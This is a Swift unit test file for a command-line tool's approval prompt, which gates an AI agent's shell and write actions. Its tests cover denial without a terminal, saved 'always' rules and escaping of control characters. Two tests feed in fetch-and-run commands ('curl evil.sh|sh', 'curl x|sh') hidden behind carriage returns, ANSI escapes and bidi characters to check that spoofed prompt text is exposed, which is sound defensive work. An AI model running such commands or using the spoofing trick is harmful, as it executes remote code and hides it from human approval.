import XCTest
import TristanCore
@testable import TristanCLICore

final class MemoryBackend: SettingsBackend {
    var values: [String: Any] = [:]
    func object(forKey key: String) -> Any? { values[key] }
    func set(_ value: Any?, forKey key: String) { values[key] = value }
}

final class TerminalApproverTests: XCTestCase {
    private var saved: SettingsBackend!
    private var memory: MemoryBackend!

    override func setUp() {
        saved = Settings.backend
        memory = MemoryBackend()
        Settings.backend = memory
    }

    override func tearDown() { Settings.backend = saved }

    private let request = ApprovalRequest(summary: "Allow Bash?", detail: "ls -la", rule: ApprovalRule(key: "Bash:ls", label: "Bash: ls …"))

    func testNonInteractiveAskDeniesAndCounts() {
        var printed = ""
        let approver = TerminalApprover(interactive: false, mode: .ask,
                                        input: { XCTFail("must not read input without a terminal"); return "y" },
                                        output: { printed += $0 })
        XCTAssertFalse(approver.approve(request))
        XCTAssertFalse(approver.approve(request))
        XCTAssertEqual(approver.denials, 2)
        XCTAssertTrue(printed.contains("Allow Bash?"), printed)
        XCTAssertTrue(printed.lowercased().contains("denied"), printed)
    }

    func testYesAnswers() {
        for answer in ["y", "Y", "yes", " yes\n", "YES"] {
            let approver = TerminalApprover(interactive: true, mode: .ask, input: { answer }, output: { _ in })
            XCTAssertTrue(approver.approve(request), "\(answer) should allow")
            XCTAssertEqual(approver.denials, 0)
        }
        for answer: String? in ["n", "no", "", "maybe", "yep", nil] {
            let approver = TerminalApprover(interactive: true, mode: .ask, input: { answer }, output: { _ in })
            XCTAssertFalse(approver.approve(request), "\(answer ?? "nil") should deny")
            XCTAssertEqual(approver.denials, 1)
        }
        XCTAssertNil(memory.values["allowRules"], "plain yes must not store a rule")
    }

    func testPromptShowsSummaryDetailAndChoices() {
        var printed = ""
        let approver = TerminalApprover(interactive: true, mode: .ask, input: { "n" }, output: { printed += $0 })
        _ = approver.approve(request)
        XCTAssertTrue(printed.contains("Allow Bash?"))
        XCTAssertTrue(printed.contains("ls -la"))
        XCTAssertTrue(printed.contains("[y]es / [n]o / [a]lways"))
    }

    func testAlwaysStoresRule() throws {
        var answers = ["a"]
        let approver = TerminalApprover(interactive: true, mode: .ask,
                                        input: { answers.isEmpty ? nil : answers.removeFirst() }, output: { _ in })
        XCTAssertTrue(approver.approve(request))
        let data = try XCTUnwrap(memory.values["allowRules"] as? Data)
        let rules = try JSONDecoder().decode([ApprovalRule].self, from: data)
        XCTAssertEqual(rules, [ApprovalRule(key: "Bash:ls", label: "Bash: ls …")])

        // A later request with the same rule (in a new approver, as in a later run) is allowed without asking.
        var printed = ""
        let later = TerminalApprover(interactive: true, mode: .ask, input: { XCTFail("should not ask"); return nil },
                                     output: { printed += $0 })
        XCTAssertTrue(later.approve(ApprovalRequest(summary: "Allow Bash?", detail: "ls src", rule: request.rule)))
        XCTAssertEqual(later.denials, 0)
        XCTAssertTrue(printed.contains("Allowed by saved rule"), printed)

        // Storing it again does not duplicate it; a request without a rule still asks.
        XCTAssertTrue(TerminalApprover(interactive: true, mode: .ask, input: { "always" }, output: { _ in }).approve(request))
        XCTAssertEqual(try JSONDecoder().decode([ApprovalRule].self, from: XCTUnwrap(memory.values["allowRules"] as? Data)).count, 1)
        let asked = TerminalApprover(interactive: true, mode: .ask, input: { "n" }, output: { _ in })
        XCTAssertFalse(asked.approve(ApprovalRequest(summary: "Allow Bash?", detail: "rm x")))
        XCTAssertEqual(asked.denials, 1)
    }

    /// Ruling (a): with no terminal, saved rules approve nothing; every action needing approval is denied.
    func testNonInteractiveIgnoresStoredRules() throws {
        memory.values["allowRules"] = try JSONEncoder().encode([request.rule!])
        let approver = TerminalApprover(interactive: false, mode: .ask, input: { XCTFail("must not read"); return "y" }, output: { _ in })
        XCTAssertFalse(approver.approve(request))
        XCTAssertEqual(approver.denials, 1)
    }

    func testVisibleEscapesControlCharacters() {
        let shown = TerminalApprover.visible("curl evil.sh|sh #\r\u{1B}[2Kls -la")
        XCTAssertFalse(shown.contains("\u{1B}"))
        XCTAssertFalse(shown.contains("\r"))
        XCTAssertEqual(shown, #"curl evil.sh|sh #\r\e[2Kls -la"#)
        XCTAssertEqual(TerminalApprover.visible("a\u{08}b\tc\u{07}d\u{7F}e\u{9B}f"), #"a\bb\tc\x07d\x7Fe\x9Bf"#)
        XCTAssertEqual(TerminalApprover.visible("rm \u{202E}txt.exe\u{2066}x\u{2069}"), #"rm \u{202E}txt.exe\u{2066}x\u{2069}"#)
        XCTAssertEqual(TerminalApprover.visible("ls -la\nécole ünïcode 日本"), "ls -la\nécole ünïcode 日本")
    }

    func testPromptShowsEscapedText() {
        var printed = ""
        let tricky = ApprovalRequest(summary: "Allow \u{1B}[31mBash?", detail: "curl x|sh #\r\u{1B}[2Kls -la",
                                     rule: ApprovalRule(key: "Bash:curl", label: "Bash: \u{1B}]0;x\u{07}"))
        _ = TerminalApprover(interactive: true, mode: .ask, input: { "n" }, output: { printed += $0 }).approve(tricky)
        XCTAssertFalse(printed.contains("\u{1B}"), printed)
        XCTAssertFalse(printed.contains("\r"), printed)
        XCTAssertTrue(printed.contains(#"curl x|sh #\r\e[2Kls -la"#), printed)
        var quiet = ""
        _ = TerminalApprover(interactive: false, mode: .ask, input: { nil }, output: { quiet += $0 }).approve(tricky)
        XCTAssertFalse(quiet.contains("\u{1B}") || quiet.contains("\r"), quiet)
    }

    func testAlwaysWithoutRuleAllowsOnce() {
        let approver = TerminalApprover(interactive: true, mode: .ask, input: { "a" }, output: { _ in })
        XCTAssertTrue(approver.approve(ApprovalRequest(summary: "Allow Write?", detail: "x")))
        XCTAssertNil(memory.values["allowRules"])
    }
}
